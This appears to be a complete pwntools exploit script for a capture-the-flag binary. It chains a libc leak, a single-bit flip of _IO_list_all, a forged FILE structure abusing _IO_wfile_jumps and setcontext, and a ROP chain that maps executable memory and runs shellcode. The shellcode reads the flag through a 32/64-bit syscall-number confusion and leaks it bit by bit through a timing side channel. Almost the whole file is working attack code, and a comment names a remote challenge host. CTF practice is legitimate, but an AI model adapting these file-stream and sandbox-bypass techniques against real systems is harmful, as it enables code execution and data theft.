#!/usr/bin/env python3

from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import os, sys, time, threading, queue, resource

resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
p =0
info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB(p):
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*_IO_flush_all+227
        brva 0x01380 
        b*_IO_wdoallocbuf
        b*__rpc_thread_key_cleanup+46
        b*mmap64+42
        b*__memmove_erms+33
        c
        ''')
        sleep(1)



def find_bit_to_flip(byte_src, byte_target):
    diff = byte_src ^ byte_target

    if diff == 0:
        return None

    if diff & (diff - 1):
        return None

    return diff.bit_length() - 1

EXTRA = 0x100000000
FLAGPATH = b'flag\0'
BASE = 0x40000000
RWX = 0x100000
PATH, IOV, BUF = 0x80, 0xa0, 0x800
JOBS = 2
worker_state = threading.local()

def shell_gen(idx = 0, mask = 0):
    src = f'''
     /* Open the flag with i386 openat (syscall number 295). */
        mov  ebx, -100
        mov  ecx, {RWX + PATH}
        xor  edx, edx
        xor  esi, esi
        mov  eax, 295
        int  0x80

        /* Read the flag with x86_64 preadv (syscall number 295). */
        mov  edi, eax
        mov  esi, {RWX + IOV}
        mov  edx, 1
        xor  r10d, r10d
        xor  r8d, r8d
        mov  eax, 295
        syscall

        /* Baseline delay: confirms that the shellcode ran. */
        mov  rcx, {BASE}
        baseline_delay:
            dec  rcx
            jnz  baseline_delay

        /* A zero mask keeps the fast baseline; a set bit adds the delay. */
        movzx eax, byte ptr [{RWX+BUF+idx}]

        /*If not = 0 */
        test  al, {mask} 
        jz    no_extra_delay

        mov  rcx, {EXTRA}
    extra_delay:
        dec  rcx
        jnz  extra_delay

    no_extra_delay:
        ud2
    '''
    code_region = asm(src).ljust(PATH, b'\x90')
    path_region = FLAGPATH.ljust(IOV - PATH, b'\x00')
    iovec = p64(RWX + BUF) + p64(0x200)

    return code_region+path_region+iovec


chunk = 0
offset = 0
cond  = 1
IO_list_all=0
first_bit = 0
def get_process_time(idx=0, mask=0):

# nc 35.198.75.208 30660
    while True:
        p = remote('0', 1338) if args.REMOTE else process([exe.path])
        try:
            first_bit = -1
            size = 0x100000000
            slna(b'gib\n', size, p)
            chunk = int(p.recvline()[:-1], 16)

            if args.REMOTE:
                libc.address = chunk + 0x100003ff0
            else:
                libc.address = chunk + 0x100000ff0

            io_list_all = libc.address + 0x2044c0
            stderr = libc.sym._IO_2_1_stderr_
            offset = (stderr - chunk) & 0xffffff
            target_address = chunk + offset
            info(f'libc base: {hex(libc.address)}')
            info(f'stderr: {hex(stderr)}')
            info(f'IO_list_all: {hex(io_list_all)}')
            source_byte = (stderr >> 32) & 0xff
            target_byte = (target_address >> 32) & 0xff
            first_bit = find_bit_to_flip(source_byte, target_byte)

            slna(b'gib\n', offset, p)
            if first_bit is None:
                continue

            setcontext = libc.sym.setcontext + 61
            thread_cleanup = libc.sym.__rpc_thread_key_cleanup + 46
            fake_file = target_address

            io = FileStructure()
            io.flags = 0x3b01010101010101
            io._IO_write_base = 0
            io._IO_write_ptr = libc.address
            io.chain = libc.sym.stdout
            io._wide_data = fake_file + 0x1c0 - 0xe0
            io._lock = libc.sym._IO_stdfile_2_lock
            io.vtable = libc.sym._IO_wfile_jumps

            load = bytes(io).ljust(0x50, b'\0')
            load += flat(b'\0' * 0xb8, fake_file + 0x1d0).ljust(0xe0, b'\0')
            load += flat(fake_file + 0x1c8 - 0x68, thread_cleanup)

            frame = bytearray(0xf8)
            frame[0x20:0x28] = p64(setcontext)
            frame[0x68:0x70] = p64(RWX) # RDI
            frame[0x70:0x78] = p64(0x2000) # RSI
            frame[0x88:0x90] = p64(7) # RDX 
            frame[0x98:0xa0] = p64(0x32) 
            frame[0xa0:0xa8] = p64(fake_file + 0x6a8) # stack
            frame[0xa8:0xb0] = p64(libc.sym.mmap) # rip
            load += frame
            load = load.ljust(0x5b0, b'\0')

            pop_rdi = 0x1157bc + libc.address
            pop_rsi = 0x1261b1 + libc.address
            pop_rcx = 0x00000000000a877e + libc.address
            movsb = 0xba7ff + libc.address
            shellcode = shell_gen(idx, mask)

            load += frame
            load += flat(
                pop_rdi, RWX,
                pop_rsi, fake_file + 0x6e8,
                pop_rcx, len(shellcode),
                movsb,
                RWX,
            )
            load += shellcode
            GDB(p)
            sa(b'Whats your name challenger?\n', load, p)
            slna(b'first addr\n', io_list_all + 4, p)
            input("check")
            start_time = time.time()
            slna(b'first bit\n', first_bit, p)
            input("Wait")
            p.recvall(timeout=20)
            return time.time() - start_time
        finally:
            p.close()
FAILURE_TIME = VALID_TIME = 0

def get_time(n=2):
    def median_time(idx = 0, mask = 0):
        time_list = []
        for _ in range(n * 5):
            value = get_process_time(idx, mask)
            if value is not None:
                time_list.append(value)
            if len(time_list) == n:
                break
        if not time_list:
            raise RuntimeError('Unexpected errors in median_time')
      
        time_list.sort()
        return time_list[len(time_list) // 2]
    
    baseline_time = median_time(0, 0)        
    delayed_time = median_time(0, 0xff)       
    separation = delayed_time - baseline_time
    if separation >= max(0.1, baseline_time * 0.05):
        return baseline_time, delayed_time

    raise RuntimeError(f'Unexpected error in get_time')



def initialize_timing_thresholds():
    global FAILURE_TIME, VALID_TIME

    baseline_time, delayed_time = get_time()
    FAILURE_TIME = baseline_time * 0.45
    VALID_TIME = baseline_time + (delayed_time - baseline_time) * 0.40
    print(
        f'[*] basetime = {baseline_time:.3f}s delayed={delayed_time:.3f}s  '
        f'fail<{FAILURE_TIME:.3f}  Valid time ={VALID_TIME:.3f}'
    )

def classify(proc_time):
    if proc_time is None or proc_time < FAILURE_TIME:
        return None
    return proc_time > VALID_TIME

def oracle(idx =0 , mask = 0):
    set_bit_count = 0
    clear_bit_count = 0

    for i in range(20):
        bit_is_set = classify(get_process_time(idx, mask))
        if bit_is_set is None:
            continue
        # +1 if bit = 1
        set_bit_count += int(bit_is_set)
        # +1 if bit = 0
        clear_bit_count += int(not bit_is_set)

        if clear_bit_count >= 1 and set_bit_count == 0:
            return False
        if set_bit_count >= 2 and set_bit_count > clear_bit_count:
            return True
        if clear_bit_count >= 3 and clear_bit_count > set_bit_count:
            return False
    raise RuntimeError('Oracle failed')

output_lock = threading.Lock()


def configure_worker():
    context.arch = 'amd64'
    context.log_level = 'error'
    worker_state.libc = ELF('libc.so.6', checksec=False)


def recover_one_bit(task):
    byte_index, bit_index = task

    while True:
        try:
            bit_is_set = oracle(byte_index, 1 << bit_index)
            return byte_index, bit_index, bit_is_set
        except Exception as error:
            with output_lock:
                print(f'\n[!] ({byte_index},{bit_index}) {error}')

NBYTES = 0x36
def recover_flag():
    recovered_flag = bytearray(NBYTES)
    bit_tasks = []

    for byte_index in range(NBYTES):
        for bit_index in range(0, 8):
            task = (byte_index, bit_index)
            bit_tasks.append(task)

    with ThreadPoolExecutor(
        max_workers = 5,
        initializer=configure_worker,
    ) as executor:
        futures = []

        for task in bit_tasks:
            future = executor.submit(recover_one_bit, task)
            futures.append(future)

        for completed_future in as_completed(futures):
            result = completed_future.result()
            byte_index = result[0]
            bit_index = result[1]
            bit_is_set = result[2]

            if bit_is_set:
                bit_value = 1 << bit_index
                recovered_flag[byte_index] |= bit_value
                
            display_value = bytes(recovered_flag).decode()
            print('\r' + display_value, end='')

    return recovered_flag


def init_time():
    global FAILURE_TIME, VALID_TIME
    baseline_time, delayed_time = get_time()
    FAILURE_TIME = baseline_time * 0.45
    VALID_TIME = baseline_time + (delayed_time - baseline_time) * 0.40
    info(f'failure time: {FAILURE_TIME}')
    info(f'Valid time: {VALID_TIME}')
init_time()
recovered_flag = recover_flag()
print('\n[+]', bytes(recovered_flag).decode())


# 0x7e94 92 db04e0  
# 0x7e94 82 db04e0

# p.interactive()
# tel &_IO_list_all
# The fourth byte
# annon:  0x7f0b bf 7ff000
# stderr: 0x7f0b cf a044e0
